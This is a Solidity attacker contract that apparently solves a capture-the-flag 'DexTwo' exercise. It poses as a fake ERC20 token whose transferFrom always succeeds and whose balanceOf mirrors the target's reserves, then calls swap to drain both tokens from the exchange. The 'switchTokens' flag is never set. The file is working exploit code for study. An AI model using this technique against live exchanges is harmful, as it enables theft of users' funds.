//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "./Level.sol";

contract Attacker {

    mapping(address => uint256) private _balances;

    DexTwo target;
    address token1;
    address token2;
    
    bool switchTokens;

    constructor(address _target) {
        target = DexTwo(_target);
        token1 = target.token1();
        token2 = target.token2();
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        return true;
    }

    function attack() external {
        uint256 amountToSend = target.balanceOf(token2, address(target));
        target.swap(address(this), token2, amountToSend);

        amountToSend = target.balanceOf(token1, address(target));
        target.swap(address(this), token1, amountToSend);
    }

   function balanceOf(address account) public view returns (uint256) {
    if(switchTokens) {
     return target.balanceOf(token2, address(target));
    }
    else {
     return target.balanceOf(token1, address(target));
    }
    
    }



}